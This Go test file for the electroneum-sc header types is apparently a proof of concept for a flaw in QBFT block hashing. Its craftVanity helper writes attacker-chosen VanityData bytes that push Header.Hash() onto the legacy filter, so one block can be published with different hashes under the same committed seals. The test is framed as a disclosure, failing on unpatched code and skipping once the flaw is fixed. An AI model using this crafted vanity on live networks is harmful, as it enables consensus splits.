package types

import (
	"bytes"
	"fmt"
	"testing"

	"github.com/electroneum/electroneum-sc/common"
	"github.com/electroneum/electroneum-sc/rlp"
)

func mkHeader(extra []byte) *Header {
	return &Header{
		ParentHash: common.HexToHash("0x01"),
		Number:     common.Big1,
		GasLimit:   30_000_000,
		Time:       1700000000,
		Difficulty: common.Big1,
		MixDigest:  IstanbulDigest, // makes Header.Hash() take the Istanbul path
		Extra:      extra,
	}
}

func qbftBytes(t *testing.T, vanity []byte, vals []common.Address, round uint32, cs [][]byte) []byte {
	t.Helper()
	b, err := rlp.EncodeToBytes(&QBFTExtra{
		VanityData: vanity, Validators: vals, Vote: nil, Round: round, CommittedSeal: cs,
	})
	if err != nil {
		t.Fatalf("encode: %v", err)
	}
	return b
}

func mkSeals(n int) [][]byte {
	out := make([][]byte, n)
	for i := range out {
		out[i] = bytes.Repeat([]byte{byte(0xA0 + i)}, IstanbulExtraSeal)
	}
	return out
}

// rlpHdrLen returns the length of the RLP header at b[0].
func rlpHdrLen(b []byte) int {
	switch c := b[0]; {
	case c < 0x80:
		return 0
	case c < 0xb8:
		return 1
	case c < 0xc0:
		return 1 + int(c-0xb7)
	case c < 0xf8:
		return 1
	default:
		return 1 + int(c-0xf7)
	}
}

// craftVanity builds a VanityData of length vlen that makes Extra[32:] parse as a
// legacy IstanbulExtra [Validators, Seal, CommittedSeal].
//
// Layout written at Extra offset 32:
//
//	f9 M1 M0   outer list, body length M, ending exactly at the end of Extra
//	c0         Validators = []
//	b9 N1 N0   Seal = one opaque byte string of length N
//
// N is sized so the Seal swallows the remaining vanity bytes and the REAL
// Validators / Vote / Round fields, leaving the REAL CommittedSeal ([][]byte) to
// be consumed as the fake struct's third field.
func craftVanity(t *testing.T, vlen int, vals []common.Address, round uint32, cs [][]byte) []byte {
	t.Helper()
	probe := qbftBytes(t, make([]byte, vlen), vals, round, cs)

	outerHdr := rlpHdrLen(probe)
	vanityStart := outerHdr + rlpHdrLen(probe[outerHdr:])
	off := 32 - vanityStart // index inside the vanity where Extra[32:] begins
	if off < 0 || off+7 > vlen {
		t.Fatalf("vlen %d unusable: off=%d", vlen, off)
	}

	csEnc, err := rlp.EncodeToBytes(cs)
	if err != nil {
		t.Fatalf("encode cs: %v", err)
	}
	csStart := len(probe) - len(csEnc)

	T := len(probe) - 32 // bytes available from Extra[32:]
	M := T - 3           // outer list body length (f9 M1 M0 is 3 bytes)
	N := csStart - 32 - 7

	if M < 256 || M > 0xffff {
		t.Fatalf("M=%d outside canonical f9 range", M)
	}
	if N < 256 || N > 0xffff {
		t.Fatalf("N=%d outside canonical b9 range", N)
	}
	// Consistency: outer body = c0 + (b9 N1 N0 + N) + csEnc
	if got := 1 + 3 + N + len(csEnc); got != M {
		t.Fatalf("length arithmetic wrong: %d != %d", got, M)
	}

	vanity := make([]byte, vlen)
	copy(vanity[off:], []byte{
		0xf9, byte(M >> 8), byte(M),
		0xc0,
		0xb9, byte(N >> 8), byte(N),
	})
	return vanity
}

// TestVanityData_FlipsHashFilter proves that attacker-chosen VanityData decides
// which hashing rule Header.Hash() applies.
//
// core/types/istanbul.go:91-99 FilteredHeader picks the rule by TRYING the legacy
// decode first, and ExtractIstanbulExtra (istanbul.go:75-86) decodes h.Extra[32:] --
// the QBFT RLP with its first 32 bytes chopped off. A VanityData longer than 32
// bytes puts those bytes under attacker control.
//
// The legacy filter (IstanbulFilteredHeader, keepSeal=true) does NOT zero Round,
// and its framing depends on the committed-seal count. The QBFT filter
// (QBFTFilteredHeaderWithRound) zeroes both. So the craft makes the block hash a
// function of exactly the two fields QBFT must exclude from it.
func TestVanityData_FlipsHashFilter(t *testing.T) {
	vals := []common.Address{common.HexToAddress("0xaa"), common.HexToAddress("0xbb")}
	quorum := mkSeals(3)

	// Control: a normal 32-byte vanity must take the QBFT path.
	normal := qbftBytes(t, make([]byte, IstanbulExtraVanity), vals, 0, quorum)
	if _, err := ExtractIstanbulExtra(mkHeader(normal)); err == nil {
		t.Fatal("normal 32-byte vanity decoded as legacy IstanbulExtra")
	}
	fmt.Printf("\n=== VANITY-CONTROLLED HASH FILTER ===\n")
	fmt.Printf("  control: 32-byte vanity  -> legacy decode fails -> QBFT filter\n")

	const vlen = 400
	vanity := craftVanity(t, vlen, vals, 0, quorum)
	crafted := qbftBytes(t, vanity, vals, 0, quorum)

	if _, err := ExtractIstanbulExtra(mkHeader(crafted)); err != nil {
		t.Fatalf("craft failed, legacy decode still errors: %v", err)
	}
	fmt.Printf("  crafted: %d-byte vanity  -> legacy decode SUCCEEDS -> legacy filter\n\n", vlen)

	// The payoff. ONE crafted vanity, sized for the quorum seal count, then the
	// same header published with two different committed-seal counts -- which is
	// exactly what a Byzantine proposer can do, since any count in
	// [ceil(2N/3), N] is accepted by verifyCommittedSeals.
	hdrA := mkHeader(qbftBytes(t, vanity, vals, 0, quorum))     // craft matches -> legacy filter
	hdrB := mkHeader(qbftBytes(t, vanity, vals, 0, mkSeals(4))) // craft no longer matches -> QBFT filter
	hdrR := mkHeader(qbftBytes(t, vanity, vals, 1, quorum))     // same seals, round 1

	_, errA := ExtractIstanbulExtra(hdrA)
	_, errB := ExtractIstanbulExtra(hdrB)
	fmt.Printf("  variant A (3 seals, round 0): legacy decode err=%v -> %s filter\n", errA, filterName(errA))
	fmt.Printf("  variant B (4 seals, round 0): legacy decode err=%v -> %s filter\n", errB, filterName(errB))
	fmt.Printf("  variant R (3 seals, round 1): legacy decode err=%v -> %s filter\n\n", nil, filterName(nil))

	hA, hB, hR := hdrA.Hash(), hdrB.Hash(), hdrR.Hash()
	fmt.Printf("  Header.Hash() A : %x\n", hA[:12])
	fmt.Printf("  Header.Hash() B : %x\n", hB[:12])
	fmt.Printf("  Header.Hash() R : %x\n\n", hR[:12])

	// The QBFT rule -- what the committed seals actually sign -- is identical for
	// A and B, because it strips CommittedSeal and zeroes Round.
	qA := hdrA.QBFTHashWithRoundNumber(0)
	qB := hdrB.QBFTHashWithRoundNumber(0)
	fmt.Printf("  QBFTHashWithRoundNumber(0) A : %x\n", qA[:12])
	fmt.Printf("  QBFTHashWithRoundNumber(0) B : %x\n", qB[:12])

	if qA != qB {
		t.Fatalf("QBFT seal-hash differs between A and B (%x vs %x); the seals would not carry over", qA[:8], qB[:8])
	}
	fmt.Printf("  -> identical, so the SAME committed seals are valid for both variants\n\n")

	if hA == hB && hA == hR {
		fmt.Printf("  [MITIGATED] all variants hash identically -> no split\n\n")
		t.Skip("FilteredHeader no longer lets VanityData pick the filter")
	}

	// Red on unpatched code: that failure IS the finding.
	if hA != hB {
		t.Errorf("SPLIT: seal count changes Header.Hash() (%x vs %x) while the seal payload is identical", hA[:8], hB[:8])
	}
	if hA != hR {
		t.Errorf("SPLIT: round changes Header.Hash() (%x vs %x) for the same prepared block", hA[:8], hR[:8])
	}
}

func filterName(err error) string {
	if err == nil {
		return "LEGACY"
	}
	return "QBFT"
}
